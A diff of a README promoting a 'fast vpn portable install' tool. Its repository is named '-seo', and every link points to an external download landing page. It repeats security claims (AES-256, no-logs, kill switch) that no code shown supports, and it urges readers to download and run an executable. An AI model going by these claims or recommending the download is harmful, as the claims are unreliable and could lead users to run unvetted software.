@@ -1,93 +1,95 @@
 # ⚡ fast vpn portable install
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge&logo=icloud&logoColor=white)](https://mandid22.github.io/fast-vpn-portable-install-landing/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-1f6feb?style=for-the-badge&logo=windows&logoColor=white)](https://mandid22.github.io/fast-vpn-portable-install-landing/)
-[![License](https://img.shields.io/badge/License-MIT-8b5cf6?style=for-the-badge&logo=github&logoColor=white)](https://mandid22.github.io/fast-vpn-portable-install-landing/)
+[![Download](https://img.shields.io/badge/Download-Get%20Package-blue?style=for-the-badge&logo=icloud&logoColor=white)](https://mandid22.github.io/fast-vpn-portable-install-landing/)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-111827?style=for-the-badge&logo=windows-terminal&logoColor=white)](https://mandid22.github.io/fast-vpn-portable-install-landing/)
+[![License](https://img.shields.io/badge/License-MIT-16a34a?style=for-the-badge&logo=github&logoColor=white)](https://mandid22.github.io/fast-vpn-portable-install-landing/)
 
 ## About
 
-**fast vpn portable install** is a clean, quick way to run a privacy-first VPN setup without a long installer flow. It focuses on **high speed**, **stable connection**, and a minimal footprint—ideal when you want a VPN ready fast, on a fresh machine or a secondary device.
+**fast vpn portable install** is a clean, no-nonsense way to run a VPN without dragging your system through a heavy installer. It’s built for people who want **high speed**, a **stable connection**, and a **privacy and security focus**—with the practicality of a portable setup.
 
-Project repo: https://github.com/mandid22/fast-vpn-portable-install-seo  
-Get the build / landing page: https://mandid22.github.io/fast-vpn-portable-install-landing/
+This repo tracks the install flow and release entry points:  
+- Landing page: https://mandid22.github.io/fast-vpn-portable-install-landing/  
+- Repository: https://github.com/mandid22/fast-vpn-portable-install-seo  
 
 ## Features
 
-- **AES-256 encryption** for traffic protection
-- **No-Logs policy** mindset: keep usage minimal and private
-- **Kill Switch** to block traffic if the tunnel drops
-- **Global Servers** for flexible routing and region choices
-- **High speed** connection tuning for everyday use (browsing, streaming, work calls)
-- Simple start/stop flow with clear status feedback
-- Portable-friendly layout (keep configs close, avoid system clutter)
+- **AES-256 encryption** for strong traffic protection
+- **No-Logs policy** mindset: keep your browsing private
+- **Kill Switch** support to prevent leaks if the tunnel drops
+- **Global Servers** coverage for flexible routing
+- **High speed** performance tuned for everyday work and streaming
+- **Stable connection** with quick reconnect behavior
+- Portable-first workflow: keep configs together, keep cleanup simple
 
 ## System Requirements
 
 | Item | Requirement |
 |---|---|
-| Windows | Windows 10/11 (x64 recommended) |
+| Windows | Windows 10/11 (64-bit) |
 | macOS | macOS 12+ |
-| Linux | Ubuntu 20.04+ / equivalent modern distro |
+| Linux | Ubuntu 20.04+/Debian-based or equivalent |
 | RAM | 2 GB minimum (4 GB recommended) |
 | Storage | 200 MB free space |
-| Internet | Stable broadband connection |
+| Internet | Stable connection required (Wi‑Fi or Ethernet) |
 
 ## Installation
 
-All downloads and install assets are linked from the landing page:  
-https://mandid22.github.io/fast-vpn-portable-install-landing/
+> All install entry points and the latest package are published on the landing page:  
+> https://mandid22.github.io/fast-vpn-portable-install-landing/
 
 ### Windows
-1. Open the landing page and grab the **portable package**.
-2. Extract to a folder you control (e.g. `C:\Tools\fast-vpn\`).
+1. Open the landing page and click **Download**.
+2. Extract the archive to a folder you control (e.g. `C:\Tools\fast-vpn\`).
 3. Run the app executable.
-4. Pick a server, connect, and verify the status shows **connected**.
-5. Optional: enable **Kill Switch** in settings before daily use.
+4. Sign in, pick a region, and connect.
+5. (Optional) Enable **Kill Switch** in settings before daily use.
 
 ### macOS
-1. Open the landing page and download the macOS package.
-2. Move the app to `Applications` (or keep it in a dedicated tools folder if you prefer).
-3. Launch and approve requested network permissions.
-4. Connect to a region and confirm the connection indicator is active.
+1. Go to the landing page and click **Download**.
+2. Open the package/archive and move the app to `/Applications` (or keep it in a dedicated tools folder if provided as portable).
+3. Start the app and approve network/VPN permissions when prompted.
+4. Connect to a **Global Servers** location.
 
 ### Linux
 1. Download the Linux build from the landing page.
-2. Extract the archive:
-   - `tar -xf fast-vpn*.tar.*`
-3. Run the binary (or provided script) from the extracted directory.
-4. Connect and confirm routing is active (check IP or connection status).
+2. Extract to a local directory (e.g. `~/apps/fast-vpn/`).
+3. Run the launcher/binary as provided in the package notes.
+4. Connect and verify the **Kill Switch** setting if available in your build.
 
 ## Comparison
 
 | Option | Speed | AES-256 | No Logs | Kill Switch | Global Servers |
 |---|---:|:---:|:---:|:---:|:---:|
 | fast vpn portable install | High speed | ✅ | ✅ | ✅ | ✅ |
-| Typical free VPN | Variable | ⚠️ | ⚠️ | ❌ | ⚠️ |
-| Manual VPN setup (DIY) | Depends | ✅ | ✅ | ⚠️ | ❌ |
+| Typical free VPN | Often throttled | ❓ | ❌ | ❓ | ❌ |
+| Manual DIY tunnel setup | Varies | ✅ | ✅ | ❌ | ❌ |
 
 ## FAQ
 
-**Q: Is this actually portable?**  
-A: The goal is a minimal install footprint and quick setup. Keep it in a single folder and remove it cleanly when you’re done.
+**Does “portable install” mean no system changes at all?**  
+It aims to keep things contained. Some platforms may still request VPN/network permissions.
 
-**Q: Does it include a Kill Switch?**  
-A: Yes. Turn it on before you connect if you want traffic blocked when the tunnel drops.
+**Is a Kill Switch included?**  
+Yes—enable **Kill Switch** in settings to reduce leak risk during dropouts.
 
-**Q: What encryption does it use?**  
-A: AES-256 encryption.
+**What encryption does it use?**  
+**AES-256 encryption**.
 
-**Q: Will it slow down my connection?**  
-A: Any VPN adds overhead, but this is tuned for **high speed** and a **stable connection**. Choose a nearby server for best results.
+**Does it keep logs?**  
+It’s built around a **No-Logs policy** approach. Check the landing page notes for the current build’s policy statement.
 
 ## Download
 
-**Landing page (all builds + install assets):**  
-https://mandid22.github.io/fast-vpn-portable-install-landing/
+Get the latest package and install notes here:  
+**https://mandid22.github.io/fast-vpn-portable-install-landing/**
+
+[![Download fast vpn portable install](https://img.shields.io/badge/Download-fast%20vpn%20portable%20install-blue?style=for-the-badge&logo=download&logoColor=white)](https://mandid22.github.io/fast-vpn-portable-install-landing/)
 
 ## Final CTA
 
-[![Get fast vpn portable install](https://img.shields.io/badge/Get-fast%20vpn%20portable%20install-ff4d4d?style=for-the-badge&logo=github&logoColor=white)](https://mandid22.github.io/fast-vpn-portable-install-landing/)
-[![Open Landing Page](https://img.shields.io/badge/Open-Landing%20Page-1f6feb?style=for-the-badge&logo=firefoxbrowser&logoColor=white)](https://mandid22.github.io/fast-vpn-portable-install-landing/)
-[![View Repo](https://img.shields.io/badge/View-Repository-24292f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mandid22/fast-vpn-portable-install-seo)
+[![Open Landing Page](https://img.shields.io/badge/Open-Landing%20Page-0ea5e9?style=for-the-badge&logo=githubpages&logoColor=white)](https://mandid22.github.io/fast-vpn-portable-install-landing/)
+[![View Repository](https://img.shields.io/badge/View-Repository-111827?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mandid22/fast-vpn-portable-install-seo)
+[![Download Now](https://img.shields.io/badge/Download-Now-22c55e?style=for-the-badge&logo=icloud&logoColor=white)](https://mandid22.github.io/fast-vpn-portable-install-landing/)
 
-*Fast setup. Fast connect. Privacy and security focus—without the installer drama.*
+*Fast, private, and portable—grab fast vpn portable install and connect in minutes.*
